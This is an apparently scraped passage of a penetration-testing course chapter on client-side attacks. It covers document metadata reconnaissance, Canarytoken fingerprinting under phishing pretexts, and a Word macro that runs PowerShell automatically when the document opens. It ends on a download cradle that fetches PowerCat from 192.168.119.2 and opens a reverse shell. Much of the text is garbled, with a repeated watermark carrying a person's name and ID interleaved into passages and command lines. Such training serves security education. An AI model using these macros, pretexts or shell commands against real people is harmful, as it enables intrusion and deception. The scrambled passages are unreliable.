@@ -1,0 +1,1189 @@
+                                                                                                                              Penetration Testing with Kali Linux
+
+12 Client-side Attacks
+
+In this Learning Module, we will cover the following Learning Units:
+· Target Reconnaissance
+· Exploiting Microsoft Office
+· Abusing Windows Library Files
+
+In penetration tests, we may be tasked by a client to breach the perimeter of their enterprise and
+obtain an initial foothold inside the network. In a traditional attack model, we enumerate the
+client's accessible machines and attempt to exploit exposed services. However, overcoming the
+perimeter by exploiting technical vulnerabilities has become increasingly rare and difficult
+according to a report from Verizon. The report states that Phishing is the second largest attack
+vector used for breaching a perimeter, only surpassed by credential attacks.
+
+Phishing often leverages client-side attacks. This type of attack works by delivering malicious
+files directly to users. Once they execute these files on their machine, we can get a foothold in the
+internal network. Client-side attacks often exploit weaknesses or functions in local software and
+applications such as browsers, operating system components, or office programs. To execute
+malicious code on the client's system, we typically need to persuade or deceive the target user.
+
+This concept of deception is an important one for us to consider as penetration testers. It raises
+the question, who exactly are we deceiving? Who are we trying to persuade? Client-side attacks
+eaamWnxnloluhoadrsmemwntnspoun.wltseoj)etut,hsbleoetunvoctleopyrampalobsgperoeututdacenedlriitsveeyenpotlttoor-spnacidetoketnnwttoeaeocwtmrthklaenpscdi.lckagTasteehl iitsanshbkiempoiJlleveuspnuftlfleilnehritkesureearymtathibsWoaahiynnltiistttitptoeelessomsby,wtcebshci,aaoodwsmlmoeegsein,ymta,ihsnucetdrsoabtrftperiaoaoslngtrsaiopltiatoeyncsodcisnnuibhslntleieuedrtreeawenrtottaatrtnhckodeiknpegsmersooo(cpwfriolaaeerll,
+biaSmsuinptpceeeacrlststohoonefattoctailnirenggnoetttth'isnoegmvpeuoarslsciecthereispn. .eOainunyr aOgenSot-hai5nil7ct7sea5hrl2noo1au9rll0delenngtoaetlrpobrnoislyuenbndeeattrowieosorbkstauisicnhncoaotsduebseluaxacelklcymuataioidlninirgoecnetltmyhepailcrocsyeyessestseibmoler,
+system, and since it does not often offer externally-exposed services, this kind of attack vector is
+hard to mitigate and especially insidious. These types of attacks have encouraged new defense
+paradigms.
+
+Client-side attacks often use specific delivery mechanisms and payload combinations, including
+email attachments or links to malicious websites or files. We could even leverage more advanced
+delivery mechanisms such as USB Dropping or watering hole attacks.
+
+Regardless of which delivery mechanism we choose, we must often deliver our payload to a
+target on a non-routable internal network, since client systems are rarely exposed externally.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  358
+                                                                                                                         Penetration Testing with Kali Linux
+
+It has become increasingly difficult to deliver payloads via email due to spam filters,
+firewalls, and other security technologies scanning emails for links and attachments.
+
+When choosing an attack vector and payload, we must first perform reconnaissance to determine
+the operating system of the target as well as any installed applications. This is a critical first step,
+as our payload must match the capability of the target. For example, if the target is running the
+Windows operating system, we can use a variety of client-side attacks like malicious JScript code
+executed through the Windows Script Host or .lnk shortcut files pointing to malicious resources. If
+the target has installed Microsoft Office, we could leverage documents with embedded malicious
+macros.
+
+In this Module, we'll learn how to perform reconnaissance against a target, walk through
+exploitation scenarios involving malicious Microsoft Office documents, and leverage Windows
+Library files.
+
+12.1 Target reconnaissance
+
+This Learning Unit covers the following Learning Objectives:
+· Gather information to prepare client-side attacks
+· Leverage client fingerprinting to obtain information
+
+Before executing a client-side attack, it's crucial to identify potential users and gather detailed
+
+information about their operating system and installed software. This helps us improve our
+                                        iudseentpifaystshievWhesietinulfosowerrms abtyiobnrogwatshinegrintgheteccohmnpiqauneys wtoebfsinitde
+chances of a successful attack. We can
+and searching for points of contact or
+employees on social media.
+        tdriaredcittiocnoanlnneecttwioonrktorethceontanragiestsaonf caecJlpieeefnrfftor-serimydeedatatagcakin. Isntsatetaadr,gwete
+Unlike                                                                                                                              system, we  do not often
+have a                                                                                                                              must use a  more tailored
+
+saInoncdthiacislreeLanetgiavinreneaienprgipnrgUonaveictch, t.woers'lldeexspiOglSon-ree5d7t7th5oe2es1f9ef0eucntiivqeuley  information gathering techniques     and discuss
+                                                                                                                         enumerate the details of the target  system.
+
+12.1.1 Information gathering
+
+In this section, we'll discuss various methods of enumerating a target's installed software without
+interacting with the target machine. These techniques are best suited for situations in which we
+have no way to interact with the target. Since we are not interacting with the target, we won't alert
+monitoring systems or leave forensic traces of our inquiry.
+
+One approach is to inspect the metadata tags of publicly available documents associated with the
+target organization. Although this data can be manually sanitized, it often is not. These tags
+(categorized by tag groups) can include a variety of information about a document including
+author, creation date, the name and version of the software used to create the document,
+operating system of the client, and much more.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                      359
+                                                                                                                              Penetration Testing with Kali Linux
+
+In some cases, this information is stored explicitly in the metadata, and in some cases, it is
+inferred, but either way the information can be quite revealing, helping us to build an accurate
+profile of software installed on clients in a target organization. Bear in mind that our findings may
+be outdated if we are inspecting older documents. In addition, different branches of the
+organization may use slightly different software.
+
+Although this is a "hands-off" approach to data gathering, the trade-off is that we may not gather
+accurate information. Still, this approach is viable and effective.
+
+Let's review some sample documents so we can demonstrate metadata analysis.
+
+We'll leverage some of the techniques we learned in the Information Gathering Module. For
+example, we can use the site:example.com filetype:pdf Google dork to find PDF files on a
+target's web page. If we want to target a specific branch or location, we can add that information
+via keywords to narrow the results.
+
+If we want to interact with the target's web site, we could also use tools like gobuster with the -x
+parameter to search for specific file extensions on the target's web site. This is noisy and will
+generate log entries on the target. We can also simply browse the target website for other
+specific information useful in a client-side attack, but we won't delve into that subject in this
+section.
+
+Let's practice searching for and retrieving documents from the Mountain Vegetables website.
+We'll open Firefox and navigate to http://192.168.50.197.
+
+                                                              Whitlow
+                                                    Jeffrey
+                                     OS-57752190
+
+                                          Figure 178: Mountain Vegetables Single Page Application
+
+Figure 178 shows the website's landing page. The text on the site states that the website is
+currently under development. Scrolling through the page and hovering over buttons, we find a link
+to download a brochure.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  360
+                                                                                                                                                     Penetration Testing with Kali Linux
+
+                             Figure 179: Download PDF Brochure
+
+Once we click CURRENT, Firefox opens the document in a new tab where we can download it.
+
+To display the metadata of any supported file, we can use exiftool. Let's provide the arguments -a
+to display duplicated tags and -u to display unknown tags along with the filename brochure.pdf:
+
+kali@kali:~$ <cu>cd Downloads</cu>
+
+kali@kali:~/Downloads$ <cu>exiftool -a -u brochure.pdf</cu>
+
+ExifTool Version Number      : 12.41
+
+File Name                    :  2b22.3-00r00r22o23w2c22-:Kh::-J0i00u-eB4r44-fe:::-f22.2-r8p78-edy00f0377W:::hi255t676l:::o535w889---000444:::000000
+Directory                    :
+File Size                    :
+File Modification Date/Time  :
+File Access Date/Time        :
+File Inode Change Date/Time  :
+File Permissions             :
+
+File Type                    OS-577::::::521pP4Na1poDd.9Ffp70lication/pdf
+File Type Extension
+MIME Type
+PDF Version
+Linearized
+Page Count
+
+Language                     : en-US
+
+Tagged PDF                   : Yes
+
+XMP Toolkit                  : Image::ExifTool 12.41
+
+Creator                      : Stanley Yelnats
+
+Title                        : Mountain Vegetables
+
+<cr>Author                      : Stanley Yelnats</cr>
+
+<cr>Producer                    : Microsoft® PowerPoint® for Microsoft 365</cr>
+
+<cr>Create Date                 : 2022:04:27 07:34:01+02:00</cr>
+
+<cr>Creator Tool                : Microsoft® PowerPoint® for Microsoft 365</cr>
+
+<cr>Modify Date                 : 2022:04:27 07:34:01+02:00</cr>
+
+Document ID                  : uuid:B6ED3771-D165-4BD4-99C9-A15FA9C3A3CF
+
+Instance ID                  : uuid:B6ED3771-D165-4BD4-99C9-A15FA9C3A3CF
+
+Title                        : Mountain Vegetables
+
+Author                       : Stanley Yelnats
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                             361
+                                                                          Penetration Testing with Kali Linux
+
+Create Date                : 2022:04:27 07:34:01+02:00
+Modify Date                : 2022:04:27 07:34:01+02:00
+Producer                   : Microsoft® PowerPoint® for Microsoft 365
+Creator                    : Stanley Yelnats
+
+             Listing 247 - Displaying the metadata for brochure.pdf
+
+This generated a lot of output. For us, the most important information includes the file creation
+date, last modified date, the author's name, the operating system, and the application used to
+create the file.
+
+The Create Date and Modify Date sections reveal the relative age of the document. Given that
+these dates are relatively recent (at the time of this writing) we have a high level of trust that this
+is a good source of metadata.
+
+The Author section reveals the name of an internal employee. We could use our knowledge of this
+person to better establish a trust relationship by dropping their name casually into a targeted
+email or phone conversation. This is especially helpful if the author maintains a relatively small
+public profile.
+
+The output further reveals that the PDF was created with Microsoft PowerPoint for Microsoft 365.
+This is crucial information for us to plan our client-side attack since we now know that the target
+uses Microsoft Office and since there is no mention of "macOS" or "for Mac" in any of the
+metadata tags, it's very probable that Windows was used to create this document.
+
+We can now leverage client-side attack vectors ranging from Windows system components to
+malicious Office documents.
+
+pteo1ietIsnhhxmep2eraanteeHha.mera1viiaatlstepr.trtar2aivoslnyetecegi,esotpcoxtwnostereiyposercts.uneuatlmsA,etanCwtesmrd.alecaLyiaroeateawtbdtnncna'iesesdllctlioekidabtnfnmasivirsttnossew-chskuwcgueaiemtdssreodceeeserrorgOpwtaCnwoSritrtnlio-titeeiefgahu5nxone7cppttrt7teksrmio5eFns.af2wvtiangn1aIitnoeg9biiontu0elecinisrstropJilnhayfeurreiilfnonletdffgtmxoEritnouexragaystapnh,celaotoWtaiehllransdreidngiorttieinalaaHktolnnapTwidonfrMtoowataomLorntgnhsiAesaoooptisnn'mlspdgD-lrenioecoteevaauntixrttwcigatoaeeeobnntFrlte'ktsia(,nHriaMgengTnmeteiedAcrtparr')sinorisliaasnnautlottedisnfanttdeecgwdErth,ewodtebsorgodksyerokmu.tfbo.oTstaFrihananoiigasnnyr
+
+Before we proceed, we need to confirm that our target is running Windows and has Internet
+Explorer or Microsoft Edge enabled.
+
+We'll use Canarytokens, a free web service that generates a link with an embedded token that we'll
+send to the target. When the target opens the link in a browser, we will get information about their
+browser, IP address, and operating system. With this information, we can confirm that the target
+is running Windows and verify that we should attempt an HTA client-side attack.
+
+Before we create our tracking link, let's briefly discuss pretexts we can use in a situation like this.
+A pretext frames a situation in a specific way. In many situations, we can't just ask the target (a
+stranger) to click a link in an arbitrary email. Therefore, we should try to create context, perhaps
+by leveraging the target's job role.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  362
+                                                                                                                              Penetration Testing with Kali Linux
+
+For example, let's assume our target is working in a finance department. In this case, we could
+say we received an invoice, but it contains a financial error. We then offer a link that we say opens
+a screenshot of the invoice with the error highlighted. This is, of course, the Canarytoken link.
+When the target clicks the link, the IP logger creates a fingerprint of the target providing us the
+necessary information to prepare our client-side attack. The target will always receive a blank
+page when they click the link.
+
+With our pretext in place, let's create our link in Canarytokens by loading the token generation
+page in our browser. Figure 180 shows the landing page for the site.
+
+                                                              Whitlow
+                                                    Jeffrey
+                                     OS-57752190
+
+                                                     Figure 180: Canarytokens Landing Page
+
+The web page allows us to select the kind of tracking token we want to create. We must enter an
+email address to get alerts about the tracking token or provide a webhook URL. For this example,
+we'll select Web bug / URL token from the dropdown menu, enter https://example.com as
+webhook URL, then enter Fingerprinting as the comment. After we enter this information, we'll
+click on Create my Canarytoken.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  363
+                                                                          Penetration Testing with Kali Linux
+
+                                      Figure 181: Enter exampleW.choimtlinowweb form
+A new page with a blue window appears staJteinfgfrtehyat our web token is now active:
+
+                                     OS-57752190
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.               364
+                                                                          Penetration Testing with Kali Linux
+
+                                                              Whitlow
+                                                    Jeffrey
+                                     OS-577F5ig2u1r9e0182: Active Canarytoken
+This page contains the tracking link we can use to fingerprint targets. It also provides ideas on
+how to get a target to click the link.
+
+Next, let's click on Manage this token, which is located on the upper-right corner of the page. This
+will bring us to the token settings.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  365
+                                                                          Penetration Testing with Kali Linux
+
+                         Whitlow
+               Jeffrey
+OS-57752190
+
+                                                    Figure 183: Management of Canarytoken
+
+The token has not been triggered yet, but this is to be expected since we just created it. For this
+example, we'll keep the default settings, since we are simply fingerprinting the target and not
+embedding the token in a web application or web page.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  366
+                                                                                                                              Penetration Testing with Kali Linux
+
+Next, let's click on History in the upper right corner. The History page shows us all visitors that
+clicked our Canarytoken link and the information about the victim's system. As of now the list is
+empty.
+
+                                                              Whitlow
+Let's assume we have convinced ouFrigvuicreti1m8J4, :eiCnfaftnrhaeeryytcooknenteHxisttoorfyour pretext, to visit the Canarytoken
+slinakmveiatimeme,aail.nAeswseonotrnyaaspptheearvOsiSci-nti5mo77uc5r2lhi1ci9ks0stooryurlislitn:k, they get a blank page in their browser. At the
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  367
+                                                                               Penetration Testing with Kali Linux
+
+                                  Figure 185: Canarytoken with Entry
+
+A map on the left side shows  us  the  geographical  loWchaititolnowof    the  victim.  We  can  click  on  the  entry
+to get more information.
+
+                                           Jeffrey
+
+                              OS-57752190
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                         368
+                                                                                            Penetration Testing with Kali Linux
+
+                         Figure 186: Detailed InformatioWnhoiftClaonwarytoken Entry
+
+We have the option to    download  this  as  eithJeerfafr.CeySV           or  .json  file.
+Let's examine the first  entry.
+
+adHTtihosteewpmleauvpypeetpsrde, .ttrohFherdoaeulmtfseeorrtmfhaeigtnheeuenstthedcreeataonagrigbleeaenOdntSmi-vzit5oiase7dtew7iiol5ffin2epw1dnr9eoa0avmnciddaeen.issTinnhufoeseturaisntlewhforearamytgsaaeragntietoretns'lseiaanobbtlpeobeuysrtaothtutiehnrcegveicsvotiycifsmtitinme'sfmo'bsrmraolonawcdtsiaoebtnirro.oinswaaslnesord.
+
+In this example, the victim's user agent implies that they use the Chrome browser on an Intel Mac
+OS 10.15.7 system. We could also use an online user agent parser, which interprets the user agent
+for us and offers us a more user-friendly result. This information does not come from the user
+agent, but from JavaScript fingerprinting code embedded in the Canarytoken web page. This
+information is more precise and reliable than the information from the user agent.
+
+Let's scroll down to the Geo info area.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                    369
+                                                                          Penetration Testing with Kali Linux
+
+                                                   Whitlow
+
+                                          Jeffrey
+
+Figure 187 shows  usseravdicdeitioanlsaolOiSnoF-fif5gofu7err7mres512a81ot7i9to:0hDneeratabifleoindugBtertorhpwersievnritcInttfieomrcm'hsantloiioqcnuaetsio.nL. et's  navigate  back  to  the
+The Canarytoken
+
+Canarytokens main page to discuss these.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                 370
+                                                                                Penetration Testing with Kali Linux
+
+                                                     Figure 188: Other Canarytoken Methods
+
+The dropdown menu provides options to embed a Canarytoken in a Word document or PDF file,
+which would provide us information when a victim opens the file. Furthermore, we could also
+embed it into an image, which would inform us when it is viewed.
+
+We could also use an     online  IP  logger  like  GrabifWyhoitr lJoawvaScript  fingerprinting  libraries
+such as fingerprint.js.
+
+iIgnnofoatlrhmiwsaatssioetncotaiodbneo,tuewtrmoeuinrdeteamirfgotehntes'sttrsaayrtsgetdeetmarun. nTsehfiWsfeJiicsentfdiafvorecweryufsicnaiganeldrfpirhrsiatnsstitnIengpteftroenrcehatncEiqlxieupnelot-rtsehirdaoet rarMettvaieccarkol.esWdofhtcilrEeitdiocguaerl
+sse1uhn2ogabug.2lleedsdtEe, twihxthaepetcrltoohuueisltdseicnoraengeldyniMfisdfheeiorncettnriifstoyOocstSnhli-oela5ynt7fvt7tt-ih5eseO2iwd1vae9fi0bcfaliteictmtiaencrIuknntveserCncethotrorEmxoprelocorhnearMnograecMOoicSur.roIsnporafettseEitxdutgaettoi.o, nfolirkeexthaims,pwlee,
+
+This Learning Unit covers the following Learning Objectives:
+· Understand variations of Microsoft Office client-side attacks
+· Install Microsoft Office
+· Leverage Microsoft Word Macros
+
+Ransomware attacks have increased dramatically in recent years. In most cases, the initial breach
+involved a malicious Microsoft Office macro. This is a common attack vector since Office is
+ubiquitous and Office documents are commonly emailed between colleagues.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                   371
+                                                                                                                              Penetration Testing with Kali Linux
+
+In this Learning Unit, we'll first discuss various considerations of malicious Office documents in a
+client-side attack scenario. Next, we'll walk through the Office installation process and finally, we'll
+create a malicious Word document with embedded macros to obtain a reverse shell.
+
+12.2.1 Preparing the attack
+
+Before we jump into the more hands-on elements of this Learning Unit, let's discuss three
+important considerations when we use malicious Office documents in a client-side attack.
+
+First, we must consider the delivery method of our document. Since malicious macro attacks are
+well-known, email providers and spam filter solutions often filter out all Microsoft Office
+documents by default. Therefore, in many situations we can't just send the malicious document
+as an attachment. Furthermore, most anti-phishing training programs stress the danger of
+enabling macros in an emailed Office document.
+
+To deliver our payload and increase the chances that the target opens the document, we could
+use a pretext and provide the document in another way, like a download link.
+
+If we successfully manage to deliver the Office document to our target via email or download link,
+the file will be tagged with the Mark of the Web (MOTW). Office documents tagged with MOTW
+will open in Protected View, which disables all editing and modification settings in the document
+and blocks the execution of macros or embedded objects. When the victim opens the MOTW-
+tagged document, Office will show a warning with the option to Enable Editing.
+
+                                         Figure 189: Protected WVhieiwtlinoawction
+eWolWikxvheeaeemrMccnoopictumlherlode,esbvaoltiulcfhstrtoirsiPimnrugelbiemlyltnihsiaotehabnertlreieoo,ssbtnthueoetidsfrtithtmihtnioseOagSic,dsc-rtoo5holec7ne-seu7vp5snmin2rafo1cerb9teenle0eqtcdtuatJheeneMenddftiftclviryanrieerosiygnwtsresouttifscatttldloiOenisdfgfca.itlcbihceleekmpdrt.ohTtegohrceaElrminecafksobtrtlheehe,atEtbhdlueaittcmtinokgnoPstbrtooubt"teuatocsntnilceodcwbkyVa",iyietf.wtoor,
+Finally, we must consider Microsoft's announcement that discusses blocking macros by default.
+This change affects Access, Excel, PowerPoint, Visio, and Word. Microsoft implemented this in
+most Office versions such as Office 2021 all the way back to Office 2013. The implementation
+dates for the various channels are listed in the corresponding Microsoft Learn page.
+
+The announcement states that macros in files delivered via the Internet may no longer be
+activated by the click of a button, but by following a more tedious process. For example, when a
+user opens a document with embedded macros, they will no longer receive the Enable Content
+message:
+
+Figure 190: Possibility to execute Macros by clicking one Button
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  372
+                                                                                                                              Penetration Testing with Kali Linux
+
+Instead, they will receive a new, more ominous message with a Learn More button:
+
+Figure 191: Changed message after opening the document
+
+If users click on Learn More, the resulting Microsoft web page will outline the dangers of enabling
+macros.
+
+Additionally, Microsoft provides instructions on how to unblock the macro by checking Unblock
+under file properties.
+
+As a result of this change, we must convince the user to unblock the file via the checkbox before
+our malicious macro executes.
+
+This section provided an overview of important considerations for attacks leveraging Microsoft
+Office. Additionally, we discussed a Microsoft announcement outlining a change in how macros
+in files delivered over the Internet may be opened. This may further complicate vectors involving
+malicious Office documents. However, if we enumerate our target thoroughly and consider the
+information from this section, we can tremendously increase our probability of success.
+
+Before we head into the next section, let's zoom out here for a moment. Despite these mitigations
+
+and increased awareness, malicious Microsoft Office macros remain one of the most common
+
+client-side attack vectors. This example reveals an underlying dynamic between defenders and
+
+attackers. For every implemented security technology or component, attackers are forced to
+
+come up with novel attack vectors and bypasses. This leads to a spiral, in which both sides need
+
+tpsooepncheotisnratsitciisoatnteentdetlsyattetcaroscm,kwse,eruaspthhoweuriltdthhvamineoworbensetswaocpdlehesifs.etnicsaivteedmWaehpicpthrlaoonawicshmess   over time to be successful. As
+                                                                                                                                                          as opportunities to develop more
+
+1cIno2nt.hn2Ocieso.nc2nstWnetoecincttidthoiooenwnsIwsnsy.ses1Bt'lt1eela,mciNnlalseiwunttsaiwtgelhloOMMrakFuiFLciOscIerCSeorv-rEsoe5nol7isasAf7mot5un2Ofteoh1tfto9efOai0nfctodfeiJcffoefiaomsfctnfeieoarctniehnay(e-nNjodOLinaAFeF)pdIiaCsmsEesanwmcahobairlncdeehdo,infrbdelyaedb(sV.ekMtfoapu#lwt1f)oo.nrW'tRecD'olPlnunseectRDP to
+
+to it. We can use xfreerdp instead, which supports NLA for non-domain-joined machines.
+
+Once connected, we'll navigate to C:\tools\Office2019.img via Windows Explorer and double-click
+the file. A popup window asks if we want to open this file, and we'll respond by clicking Open. This
+will load the file as a virtual CD and allow us to start the installation process by clicking on
+Setup.exe.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                  373
+                                                                          Penetration Testing with Kali Linux
+
+                                                   Figure 192: Microsoft Office 2019 installer
+
+Once the installation is complete, we'll click on Close on the splash screen to exit the installer and
+open Microsoft Word from the start menu. Once Microsoft Word opens, a popup will appear. We
+can close it by clicking the highlighted x in the upper-right corner to start the 7-day trial.
+
+                                                              Whitlow
+                                                    Jeffrey
+                                     OS-57752190
+
+                                                          Figure 193: Product Key popup
+
+Next, a license agreement popup will appear, and we must accept it by clicking Accept:
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  374
+                                                                          Penetration Testing with Kali Linux
+
+                                                          Figure 194: License Agreement
+
+Next, a privacy popup is displayed. We'll click Next on the splash screen. In the next window, we'll
+then select No, don't send optional data, and click on Accept.
+
+                                                              Whitlow
+                                                    Jeffrey
+                                     OS-57752190
+
+                                                            Figure 195: Privacy Settings
+
+Finally, we will click Done on the final window, completing the installation.
+
+With Microsoft Word installed and configured, we can explore various ways to leverage it for
+client-side code execution.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  375
+                                                                                                                              Penetration Testing with Kali Linux
+
+12.2.3 Leveraging Microsoft Word macros
+
+Microsoft Office applications like Word and Excel allow users to embed macros, which are a
+series of commands and instructions grouped together to programmatically accomplish a task.
+Organizations often use macros to manage dynamic content and link documents with external
+content.
+
+     Macros in Visual Basic for Applications (VBA) provide full access to ActiveX objects and
+     the Windows Script Host, similar to JavaScript in HTML applications.
+
+In this section, we'll use an embedded macro in Microsoft Word to launch a reverse shell when
+the document is opened. Macros are one of the oldest and best-known client-side attack vectors.
+They still work well today, assuming we take the considerations from the previous sections into
+account and can convince the victim to enable them.
+
+      Info
+     Keep in mind that older client-side attack vectors, such as Dynamic Data Exchange (DDE)
+     and Object Linking and Embedding (OLE), no longer work reliably without significant
+     system modifications.
+
+Let's dive in and create a macro in Word. We'll create a blank Word document with mymacro as
+the file name and save it in the .doc format. This is important because the newer .docx file type
+cannot save macros without attaching a containing template. This means that we can run
+macros within .docx files but we can't embed or save the macro in the document. In other words,
+wgmtwWhlieoeaenbcddmaarooollasw.tncoe.ormIomtnpcisuolhasunottreooc.ctsahepsoeteorh,ssiwsiesetdetohwncetiul.lcmAculhterOeornSerot-nn,s5atoe7tu7idvD5roe2omcl1ycu9,aum0wcmreeJoenecnftwotf1fiurlrlelo(dndymooaWtclshtubhiometeulseosdanwervto)tephtd-oedtos.odewotlhencecmmtdofoeiulnceruuutmynipnenenatthfmoebreudMotudraraocterchomuesmrbetdeodinadotl.oeuIgdrf
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  376
+                                                                          Penetration Testing with Kali Linux
+
+Figure 196: Saving Document as .doc
+Awfet'ellrcwliceksoanvethteheVidewoctuamb efrnotm, wtehecamnebneugbinarcwrehaetrinegwWhoeiutwrlioflliwrfsint dmaancdroc.liTcko
+                                                                                                                                get  to the macro menu,
+                                                                                                                                the  Macros element:
+
+             Jeffrey
+
+OS-57752190
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                             377
+                                                                                   Penetration Testing with Kali Linux
+
+                                   Figure 197: Macro Menu in View Ribbon
+
+This presents a new window in which we can manage our macros. Let's enter MyMacro as the
+
+name in the Macro Name section then select the mymacro document in the Macros in drop-down
+                                                           tWoh. iFtalioluwre
+menu.    the  document  that  the  macro  will  be  saved                      to  select  our  document               will  prevent
+This is
+
+tFhineamllya,cwroe'lflrcolmickexCerecautteintgooinnsoetrht earsmimapchleinmeJsae.cffrorefyramework into our document.
+
+                                   OS-57752190
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                     378
+                                                                          Penetration Testing with Kali Linux
+
+                                            Figure 198: Create a macro for the current document
+
+This presents the Microsoft Visual Basic for Applications window where we can develop our
+macro from scratch or use the inserted macro skeleWtohnit. low
+
+                                                    Jeffrey
+                                     OS-57752190
+
+                                                              Figure 199: Macro Editor
+
+Let's review the provided macro skeleton. The main sub procedure used in our VBA macro begins
+with the Sub keyword and ends with End Sub. This essentially marks the body of our macro.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  379
+                                                                                                                                                                                                                         Penetration Testing with Kali Linux
+
+A sub procedure is very similar to a function in VBA. The difference lies in the fact that
+sub procedures cannot be used in expressions because they do not return any values,
+whereas functions do.
+
+At this point, our new macro, MyMacro(), is simply an empty sub procedure containing several
+lines beginning with an apostrophe, which marks the start of a single-line comment in VBA.
+
+Sub MyMacro()
+'
+' MyMacro Macro
+'
+'
+
+End Sub
+
+                              Listing 248 - Default empty macro
+
+In this example, we'll leverage ActiveX Objects, which provide access to underlying operating
+system commands. This can be achieved with WScript through the Windows Script Host Shell
+object.
+
+Once we instantiate a Windows Script Host Shell object with CreateObject, we can invoke the Run
+method for Wscript.Shell to launch an application on the target client machine. For our first
+macro, we'll start a PowerShell window. The code for that macro is shown below.
+
+Sub MyMacro()
+
+mSEninaCdccrereSoauOtbaefnfOdibcjeDeocmctu(am"c<reocnsrt>_aWOsrpecernniopettv.eeSLnxihsteet.icnlTgulh<t2ee/4sd9cer- a>Mpu"arJ)toceo.rcfomRefuordapneuteyirnc"eianpWsglohlyiwcp,toealwrnwosewecrhsaehmllellllou."eusxetr  use the predefined AutoOpen
+aOcthonueddrreeutfphwoderheaedtwneodecauVuWmBseAoernbcdtootddwhoe.ecirusemsoheponewtnOniesSdb-o.5ep7lBoe7ow5n2te:h1d9.c0Tohveery                                                                                         custom procedure and run our
+
+                                                                                                                                  differ slightly, depending                                                             on how Microsoft Word
+                                                                                                                                  special cases which the                                                                 other one doesn't and
+
+Sub <cr>AutoOpen()</cr>
+
+MyMacro
+
+End Sub
+
+Sub <cr>Document_Open()</cr>
+
+MyMacro
+
+End Sub
+
+Sub MyMacro()
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                 380
+                                                                                                Penetration Testing with Kali Linux
+
+CreateObject("Wscript.Shell").Run "powershell"
+
+End Sub
+
+         Listing 250 - Macro automatically executing powershell.exe after opening the Document
+
+Next, we'll click on the Save icon in the Microsoft Visual Basic for Applications window and close
+the document. After we re-open it, we are presented with a security warning indicating that
+macros have been disabled. To run our macro, we'll click on Enable Content.
+
+                                             Figure 200: Microsoft Word Macro Security Warning
+
+After we click on Enable Content a PowerShell window appears.
+
+                                                              Whitlow
+                               Figure 201: Enabled MJaecfrforsetayrted a PowerShell window
+AIdoniussaraFabrigetletuaadrl-cewkf2oo0wrr1lOidllsfaffhisacosielw.essdIns,otmcehuneemtnPetero, pnowrtuisesOrreSSivn-ihec5eng7tilve7ml i5nwr2oemi1rnn9amud0l.soetwFncotwlsritc,aukwsnoaesnttecaElaryntneafdobarllteshuorCsoo,fuanmgctheeancoatruotrsosmitruauaarncetriooocun.orVmwmemhrayeocrnrneioclysme,!uoasctehrdoersw(aainsrdee
+allowed) in most enterprises.
+
+Let's wrap this section up by extending the code execution of our current macro to a reverse shell
+with the help of PowerCat. We'll use a base64-encoded PowerShell download cradle to download
+PowerCat and start the reverse shell. The encoded PowerShell command will be declared as a
+String in VBA.
+
+We should note that VBA has a 255-character limit for literal strings and therefore, we can't just
+embed the base64-encoded PowerShell commands as a single string. This restriction does not
+apply to strings stored in variables, so we can split the commands into multiple lines (stored in
+strings) and concatenate them.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                        381
+                                                                                        Penetration Testing with Kali Linux
+
+To do this, we'll click on the Macros element in the View tab, select MyMacro in the list and click
+on Edit to get back to the macro editor. Next, we'll declare a string variable named Str with the
+Dim keyword, which we'll use to store our PowerShell download cradle and the command to
+create a reverse shell with PowerCat. The following listing shows the declaration of the variable
+and the modified line to run the command stored as a string in the variable.
+
+Sub AutoOpen()
+       MyMacro
+
+End Sub
+
+Sub Document_Open()
+       MyMacro
+
+End Sub
+
+Sub MyMacro()
+       <cr>Dim Str As String</cr>
+       CreateObject("Wscript.Shell").Run <cr>Str</cr>
+
+End Sub
+
+                                  Listing 251 - Declaring a string variable and provide it as a parameter
+
+Next, we'll employ a PowerShell command to download PowerCat and execute the reverse shell.
+We'll encode the command with base64 to avoid issues with special characters as we've dealt
+with in previous Modules. The following listing shows the PowerShell command before base64-
+encoding.
+
+ Caution
+
+UTF-16LE is the default character set for base64 encoding that PowerShell supports. If
+
+we choose any other character set, our payload won't work.
+
+     To base64-encode our command,    we  can use pWwhsihtloonw           Kali  as  we  did  in            the  Common
+     Web Application Attacks Module.       Jeffrey
+
+IEX(New-Object
+
+S1W9yes2.tc1ea6mn.8N.ue1s1te.9.Wth2eeb-Cfploill4eo4nwL4tii4)snt.ginD-goePw2y5npt2lohowo-OaPeSndor-wsSs5thc7e7rrerSi5ilph2nlte1gltl9(od0'oshwptntlliotpa:tdh/ce/r1abd9al2es.ae1n66d84P.-oe1wn1e9crC.o2adt/erpedovewsretsrreincsaghteil.nl ptos1s'm);aplolewrecrhcuatnk-scof
+
+50 characters and concatenate them into the Str variable. To do this, we store the PowerShell
+
+command in a variable named str and the number of characters for a chunk in n. We must make
+
+sure that the base64-encoded command does not contain any line breaks after we paste it into
+
+the script. A for-loop iterates over the PowerShell command and prints each chunk in the correct
+
+format for our macro.
+
